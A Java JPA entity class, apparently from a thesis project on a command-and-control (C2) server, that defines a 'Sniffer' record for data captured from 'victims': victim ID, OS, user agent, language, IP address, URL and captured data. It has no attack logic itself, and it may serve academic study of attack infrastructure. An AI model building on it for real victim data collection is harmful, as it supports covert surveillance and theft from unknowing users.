package it.ssri.tesi.c2.model;

import jakarta.persistence.Column;
import jakarta.persistence.Entity;
import jakarta.persistence.GeneratedValue;
import jakarta.persistence.GenerationType;
import jakarta.persistence.Id;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;

import java.time.Instant;

@Entity
@Data
@AllArgsConstructor
@NoArgsConstructor
@Builder
public class Sniffer {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Integer id;

    @Column(name = "victim_id")
    private String victimId;

    @Column(name = "sniff_date")
    private Instant sniffDate;

    private String os;

    @Column(name = "user_agent")
    private String userAgent;

    @Column(name = "lang")
    private String language;

    @Column(name = "ip_address")
    private String ipAddress;

    private String url;

    private String data;

}
